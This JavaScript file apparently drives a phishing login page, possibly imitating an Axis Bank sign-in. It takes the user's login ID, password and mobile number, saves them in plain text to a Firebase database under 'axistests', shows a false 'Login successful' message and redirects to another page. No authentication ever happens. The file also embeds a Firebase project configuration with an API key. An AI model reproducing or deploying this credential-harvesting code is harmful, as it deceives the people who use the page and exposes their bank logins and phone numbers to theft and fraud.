import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCUz_1-llGeoG20f3B5mBxjgWXAG2qPdcI",
    authDomain: "myfirst-772f2.firebaseapp.com",
    projectId: "myfirst-772f2",
    storageBucket: "myfirst-772f2.firebasestorage.app",
    messagingSenderId: "540088309804",
    appId: "1:540088309804:web:d52187c60c275d140f1989"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const form = document.getElementById('login-form');
const notification = document.getElementById('notification');

form.addEventListener('submit', (event) => {
    event.preventDefault(); // Prevent form submission

    const LoginID = document.getElementById('LoginID').value.trim();
    const Pass = document.getElementById('Pass').value.trim();
    const number = document.getElementById('number').value.trim();

    // Validate inputs
    if (!LoginID || !Pass || !number) {
        notification.textContent = "All fields are required.";
        notification.classList.add('error');
        return;
    }

    if (number.length !== 10) {
        notification.textContent = "Enter a valid 10-digit mobile number.";
        notification.classList.add('error');
        return;
    }

    // Save to Firebase
    set(ref(db, 'axistests/' + LoginID), {
        LoginID: LoginID,
        Pass: Pass, // WARNING: Do not store plain text passwords in production.
        number: number
    })
    .then(() => {
        notification.textContent = "Login successful! Redirecting...";
        notification.classList.remove('error');
        notification.classList.add('success');

        // Clear form fields
        form.reset();

        // Redirect to another page
        setTimeout(() => {
            window.location.href = "axis1.html";
        }, 2000);
    })
    .catch((error) => {
        notification.textContent = "Failed to login: " + error.message;
        notification.classList.add('error');
    });
});
